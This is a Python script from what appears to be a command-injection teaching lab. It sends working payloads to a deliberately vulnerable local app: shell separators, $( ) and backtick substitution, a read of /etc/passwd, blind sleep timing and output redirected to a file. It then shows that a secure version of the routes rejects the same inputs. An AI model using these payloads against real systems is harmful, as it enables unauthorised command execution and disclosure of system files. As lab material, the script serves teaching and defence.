"""
attacks.py
Runs every common command injection technique against the vulnerable app, then
fires the same payloads at the secure routes to show they are stopped.

Each attack prints what it tries, the payload, and what came back.

Start the server first (python3 app.py), then run this (python3 attacks.py).
It talks to the app over HTTP only, the way a real attacker with a browser would.
"""

import requests
import time
import re
import html
import os

BASE = "http://127.0.0.1:5001"
PROOF = "/tmp/cmdi_proof.txt"


def banner(n, title):
    print()
    print("=" * 70)
    print(f"  ATTACK {n}: {title}")
    print("=" * 70)


def line():
    print("-" * 70)


def get_output(resp):
    """Pull the text inside the <pre> result block, cleaned up."""
    m = re.search(r"<pre>(.*?)</pre>", resp.text, re.S)
    if not m:
        box = re.search(r"class='box[^']*'>(.*?)</div>", resp.text, re.S)
        if box:
            return re.sub(r"<[^>]+>", "", html.unescape(box.group(1))).strip()
        return "(no output shown)"
    return html.unescape(m.group(1)).strip()


def lookup(host, secure=False):
    path = "/secure/lookup" if secure else "/lookup"
    return requests.get(f"{BASE}{path}", params={"host": host})


def backup(label, secure=False):
    path = "/secure/backup" if secure else "/backup"
    return requests.get(f"{BASE}{path}", params={"label": label})


# ---------------------------------------------------------------------------
# 1. Command separators: ;  &&  ||  |  and newline
# ---------------------------------------------------------------------------
def attack_separators():
    banner(1, "Command separators")
    print("Goal   : run a second command of my choice after the intended one.")
    print("The shell treats each of these as a boundary between commands.")
    line()

    cases = [
        ("semicolon ;",     "localhost; id",        "run id regardless"),
        ("and &&",          "localhost && whoami",  "run whoami if lookup ok"),
        ("or ||",           "nope.invalid || id",   "run id because lookup failed"),
        ("pipe |",          "localhost | id",        "pipe into id, which ignores input"),
        ("newline",         "localhost\nid",         "newline also ends a command"),
    ]
    for name, payload, note in cases:
        out = get_output(lookup(payload))
        # show the id/whoami line if present
        proof = ""
        for ln in out.splitlines():
            if "uid=" in ln or ln.strip() in ("root",):
                proof = ln.strip()
                break
        print(f"  {name:<12} payload={payload!r}")
        print(f"               -> {proof or out.splitlines()[-1] if out else '(nothing)'}   ({note})")


# ---------------------------------------------------------------------------
# 2. Command substitution: $( ) and backticks
# ---------------------------------------------------------------------------
def attack_substitution():
    banner(2, "Command substitution")
    print("Goal   : run a command using $( ) or backticks, with NO separator")
    print("         like ; or && at all. This slips past any filter that only")
    print("         blocks the separators. The inner command runs first.")
    print("Here the inner result is swallowed by the lookup, so I prove the")
    print("inner command ran by its side effects: a delay, then a written file.")
    line()

    # Proof 1: timing. $(sleep 3) makes the whole request pause ~3 seconds.
    t = time.time()
    lookup("localhost$(sleep 3)")
    elapsed = time.time() - t
    print(f"  payload 'localhost$(sleep 3)' responded in {elapsed:.2f}s"
          f"  -> the inner sleep ran")

    # Proof 2: side effect. The backtick form writes a file we can then read.
    sub_proof = "/tmp/cmdi_sub.txt"
    if os.path.exists(sub_proof):
        os.remove(sub_proof)
    lookup(f"localhost`id > {sub_proof}`")
    time.sleep(0.3)
    if os.path.exists(sub_proof):
        with open(sub_proof) as f:
            print(f"  payload 'localhost`id > {sub_proof}`' created the file:")
            print("     ", f.read().strip())
    else:
        print("  backtick proof file not created")


# ---------------------------------------------------------------------------
# 3. Reading a sensitive file
# ---------------------------------------------------------------------------
def attack_file_read():
    banner(3, "Reading a sensitive file")
    print("Goal   : prove this is full code execution by dumping /etc/passwd.")
    line()
    out = get_output(lookup("localhost; head -n 3 /etc/passwd"))
    print("Payload: 'localhost; head -n 3 /etc/passwd'")
    print("First lines of /etc/passwd returned by the app:")
    for ln in out.splitlines():
        if ":" in ln and "/" in ln:
            print("   ", ln.strip())


# ---------------------------------------------------------------------------
# 4. Blind, time based
# ---------------------------------------------------------------------------
def attack_blind_time():
    banner(4, "Blind injection, time based (backup)")
    print("Goal   : the backup tool shows no command output. Prove code runs by")
    print("         making it pause, and reading the answer off the clock.")
    line()

    t = time.time()
    backup(". ; sleep 1")
    base = time.time() - t

    t = time.time()
    backup(". ; sleep 5")
    delayed = time.time() - t

    print(f"  payload '. ; sleep 1' responded in {base:.2f}s")
    print(f"  payload '. ; sleep 5' responded in {delayed:.2f}s")
    print(f"  the {delayed-base:.1f}s gap proves the injected sleep ran, even"
          " though\n  the page said only 'Backup complete'.")


# ---------------------------------------------------------------------------
# 5. Blind, output redirected to a file we then read
# ---------------------------------------------------------------------------
def attack_blind_exfil():
    banner(5, "Blind injection, writing output to a file (backup)")
    print("Goal   : no output on the page, so redirect an injected command's")
    print("         output into a file, then retrieve it another way.")
    line()

    if os.path.exists(PROOF):
        os.remove(PROOF)

    payload = f". ; id > {PROOF}"
    print(f"Payload: {payload!r}")
    backup(payload)
    time.sleep(0.3)

    if os.path.exists(PROOF):
        with open(PROOF) as f:
            content = f.read().strip()
        print("Contents of the file the injected command created:")
        print("   ", content)
        print("A real attacker would redirect this into the web folder or send")
        print("it out over the network instead of a local file.")
    else:
        print("proof file was not created")


# ---------------------------------------------------------------------------
# 6. The same payloads against the secure routes
# ---------------------------------------------------------------------------
def attack_secure_check():
    banner(6, "Same payloads against the secure routes")
    print("The secure routes validate input and run commands with no shell.")
    line()

    payloads = ["localhost; id", "localhost$(id)", "localhost`whoami`",
                "localhost && whoami"]
    for p in payloads:
        out = get_output(lookup(p, secure=True))
        print(f"  secure /lookup  payload={p!r:<24} -> {out}")

    for p in [". ; sleep 5", f". ; id > {PROOF}"]:
        t = time.time()
        out = get_output(backup(p, secure=True))
        dt = time.time() - t
        print(f"  secure /backup  payload={p!r:<24} -> {out}  ({dt:.2f}s)")

    print()
    print("No command ran, no delay, nothing leaked. The input was treated as a")
    print("single argument and the allowlist rejected the bad characters too.")


if __name__ == "__main__":
    print("Running all command injection attacks against", BASE)
    attack_separators()
    attack_substitution()
    attack_file_read()
    attack_blind_time()
    attack_blind_exfil()
    attack_secure_check()
    print()
    line()
    print("Done. Out of band injection (making the server call out to an")
    print("attacker controlled server) is explained in the report but not run")
    print("here, since it needs outbound network access to a server we control.")
